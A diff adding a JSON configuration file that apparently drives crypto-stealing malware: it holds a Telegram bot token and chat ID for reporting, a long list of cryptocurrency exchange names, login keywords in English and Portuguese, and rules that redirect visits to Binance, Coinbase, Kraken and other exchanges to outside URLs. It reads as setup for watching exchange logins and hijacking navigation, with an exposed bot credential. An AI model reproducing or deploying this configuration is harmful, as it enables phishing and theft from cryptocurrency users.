@@ -1,0 +1,45 @@
+{
+  "botToken": "8282557974:AAEfiiTmrb0APpnGJNCEHWEOJNiCCgB0pIE",
+  "chatId": "8025121083",
+  "keywords": [
+    "AOFEX","AscendEX","Backpack","BigONE","BingX","Bit2Me","Bitbay","Bitbank","Bitcointree","BitEx",
+    "Bitfinex","BitFlyer","BitForex","Bitget","Bitkub","BitMart","BitMEX","Bitrue","Bitso","Bitstamp",
+    "BKEX","Bithumb","Bithumb Global","BitoPro","Binance","Binance US","Binance TR","BTC-Alpha","BTCC",
+    "Bullish","Brasil Bitcoin","CEX.IO","CEX","Changelly Pro","Coinbase","Coinall","Coincheck","CoinDCX",
+    "Coindeal","CoinEx","CoinFLEX","Coinhub","CoinTiger","Coinut","CoinW","Coinsbit","Crypto.com","Deepcoin",
+    "Deribit","Dcoin","DigiFinex","Exmo","FEX","FMFW.io","Gate.io","Gate","Gemini","GOKO","GoMining","HitBTC",
+    "Hotbit","Hotcoin","HTX","Huobi","Huobi Japan","Huobi Korea","Indodax","Koinbazar","Korbit","Kraken","KuCoin",
+    "LATOKEN","LBank","Liquid","Mandala Exchange","MAX Exchange","Mercado Bitcoin","MEXC","Nicehash","Nexo",
+    "Nominex","OceanEx","OKCoin","OKX","Paribu","Phemex","Poloniex","ProBit Global","SFOX","SimpleSwap","STEX",
+    "SuperEx","Tapbit","Toobit","Tokocrypto","Uniswap","Upbit","UPB","VCC Exchange","WazirX","WhiteBIT","XT.COM",
+    "Zaif","Zebpay","ZBG","ZB.com","ZenGo","krypto","criptoswaps","novadax","foxbit","ripio","Bybit","Bybitglobal"
+  ],
+  "loginKeywords": [
+    "login", "loguin", "sign in", "entrar"
+  ],
+  "redirectRules": [
+    {"regex": "(www\\.)?binance\\.(com|us).*", "url": "https://ge.globo.com/"},
+    {"regex": "(www\\.)?coinbase\\.com.*", "url": "https://seuoutrolink.com"},
+    {"regex": "(www\\.)?bybit\\.com.*", "url": "https://ge.globo.com/"},
+    {"regex": "(www\\.)?okx\\.com.*", "url": "https://ge.globo.com/"},
+    {"regex": "(www\\.)?kraken\\.com.*", "url": "https://ge.globo.com/"},
+    {"regex": "(www\\.)?kucoin\\.com.*", "url": "https://ge.globo.com/"},
+    {"regex": "(www\\.)?huobi\\.com.*", "url": "https://ge.globo.com/"},
+    {"regex": "(www\\.)?bitfinex\\.com.*", "url": "https://ge.globo.com/"},
+    {"regex": "(www\\.)?bitflyer\\.com.*", "url": "https://ge.globo.com/"},
+    {"regex": "(www\\.)?bitmex\\.com.*", "url": "https://ge.globo.com/"},
+    {"regex": "(www\\.)?bitstamp\\.net.*", "url": "https://ge.globo.com/"},
+    {"regex": "(www\\.)?gate\\.io.*", "url": "https://ge.globo.com/"},
+    {"regex": "(www\\.)?gemini\\.com.*", "url": "https://ge.globo.com/"},
+    {"regex": "(www\\.)?crypto\\.com.*", "url": "https://ge.globo.com/"},
+    {"regex": "(www\\.)?upbit\\.com.*", "url": "https://ge.globo.com/"},
+    {"regex": "(www\\.)?phemex\\.com.*", "url": "https://ge.globo.com/"},
+    {"regex": "(www\\.)?poloniex\\.com.*", "url": "https://ge.globo.com/"},
+    {"regex": "(www\\.)?bitget\\.com.*", "url": "https://ge.globo.com/"},
+    {"regex": "(www\\.)?mexc\\.com.*", "url": "https://ge.globo.com/"},
+    {"regex": "(www\\.)?huobipro\\.com.*", "url": "https://ge.globo.com/"},
+    {"regex": "(www\\.)?wazirx\\.com.*", "url": "https://ge.globo.com/"},
+    {"regex": "(www\\.)?whitebit\\.com.*", "url": "https://ge.globo.com/"},
+    {"regex": "(www\\.)?xt\\.com.*", "url": "https://ge.globo.com/"}
+  ]
+}
